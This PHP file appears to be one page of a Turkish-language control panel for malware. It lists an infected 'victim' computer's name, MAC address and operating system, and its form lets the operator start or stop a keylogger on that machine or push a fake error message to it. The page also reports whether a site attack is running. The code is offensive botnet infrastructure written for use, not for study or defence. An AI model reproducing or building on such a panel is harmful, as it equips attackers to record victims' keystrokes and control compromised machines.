<?php

  include("header.php");
ob_start();

					
					
	  
?>


 <div style="margin-top:2%;">  <center>

<?php


$cekilen_id=htmlspecialchars(strip_tags(addslashes(stripslashes($_GET["id"]))));


if (!is_numeric($cekilen_id)) {
header("location:index.php");    
}else{
    
include("vt.php");
$sorgu = $db->prepare("SELECT * FROM kurban WHERE id=:id");				//istenilen id deki veriyi çekme
$sorgu->execute(array(':id'=>$cekilen_id));
if($sorgu->rowCount()){
	$row=$sorgu->fetch(PDO::FETCH_ASSOC);
?>


<form action="" method="POST" style="width:25%;">
	<font face='tahoma' size='4' color='red'><a href="kurbanlarizle.php?id=<?php echo $row['macadres'];?>">Virüs detay sayfası için tıklayınız</a></font><br><br>
	<font face='tahoma' size='4' color='red'>Bilgisayar Adı =  <?php echo $row['bilgisayaradi'];?></font><br><br>
	<font face='tahoma' size='4' color='red'>Mac Adresi = <?php echo $row['macadres'];?></font><br><br>
	<font face='tahoma' size='4' color='red'>İşletim Sistemi = <?php echo $row['isletim'];?></font><br>
<?php if($row['komut']=="2" or $row['hata']=="3"){echo "<font face='tahoma' size='4' color='red'>Aktif İşlemler =</font><br>";}  if($row['komut']==2){echo "<font face='tahoma' size='4' color='red'></font><br><font face='tahoma' size='3' color='red'> Keylog Kaydediliyor</font>";}
if($row['hata']=="3"){echo "<font face='tahoma' size='4' color='red'></font><br><font face='tahoma' size='3' color='red'> Hata Mesajı Veriliyor</font><br>";}
}?>
	<?php
		$idm = '1';
	
		$sorgu = $db->prepare("SELECT * FROM genel WHERE id=:id");				//istenilen id deki veriyi çekme
		$sorgu->execute(array(':id'=>$idm));
		if($sorgu->rowCount()){
			$row=$sorgu->fetch(PDO::FETCH_ASSOC);
		if(!$row['baslat']==0){echo "<font face='tahoma' size='3' color='red'>Site Saldırısı yapılıyor</font><br><br>";}
		}
	?>
	<font face='tahoma' size='3' color='red'>Hata mesajı istiyorsanız lütfen mesaj içeriğini doldurunuz</font>
	<br><br><input type="text" name="mesag"><br><br>
	<select name="komut" id="text">
	<option value='0'>Keylog kayıt durdur</option>
	<option value='2'>Keylog kayıt et</option>
	<option value='3'>Hata mesajı verdir.</option>		
			
		</select>
	
	<h1></h1><br><button type="submit">Komutu Çalıştır</button><br>
</form>


<?php
if($_POST){
	$komut=$_POST['komut'];
	$mesag=$_POST['mesag'];
	
	if($komut=="0" or $komut=="2"){
						
						$guncelle = $db->prepare("UPDATE kurban SET komut=:komut WHERE id=:id");			//verimizi güncellemek için
					$guncelle->execute([':komut' => $komut,':id'=>$cekilen_id]);
					header("Refresh: 1;");
						}else{
	
		
					$guncelle = $db->prepare("UPDATE kurban SET hata=:hata, mesag=:mesag WHERE id=:id");			//verimizi güncellemek için
					$guncelle->execute([':hata' => $komut,':id'=>$cekilen_id,':mesag'=>$mesag]);									
					echo "<font face='tahoma' size='3' color='red'>Komut gönderildi</font> ";
						header("Refresh: 1;");
		
	
}
}
}


?>

</center></div>
<div id="particles-js"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;z-index:-6546511651;" width="1920" height="870"></canvas></div><script type="text/javascript">$.getScript("https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js", function(){ particlesJS('particles-js', { "particles": { "number": { "value": 80, "density": { "enable": true, "value_area": 800 } }, "color": { "value": "#ffffff" }, "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" }, "polygon": { "nb_sides": 5 }, "image": { "width": 100, "height": 100 } }, "opacity": { "value": 0.5, "random": false, "anim": { "enable": false, "speed": 1, "opacity_min": 0.1, "sync": false } }, "size": { "value": 5, "random": true, "anim": { "enable": false, "speed": 40, "size_min": 0.1, "sync": false } }, "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1 }, "move": { "enable": true, "speed": 6, "direction": "none", "random": false, "straight": false, "out_mode": "out", "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 } } }, "interactivity": { "detect_on": "canvas", "events": { "onhover": { "enable": true, "mode": "repulse" }, "onclick": { "enable": true, "mode": "push" }, "resize": true }, "modes": { "grab": { "distance": 400, "line_linked": { "opacity": 1 } }, "bubble": { "distance": 400, "size": 40, "duration": 2, "opacity": 8, "speed": 3 }, "repulse": { "distance": 200 }, "push": { "particles_nb": 4 }, "remove": { "particles_nb": 2 } } }, "retina_detect": true, "config_demo": { "hide_card": false, "background_color": "#b61924", "background_image": "", "background_position": "50% 50%", "background_repeat": "no-repeat", "background_size": "cover" } } );}); </script> </b></b><div align="center" class="a"><font color="white"></font></div><font color="white"><br><div align="center"></div><br> </font></body></html>
		<?php ob_end_flush(); ?>
		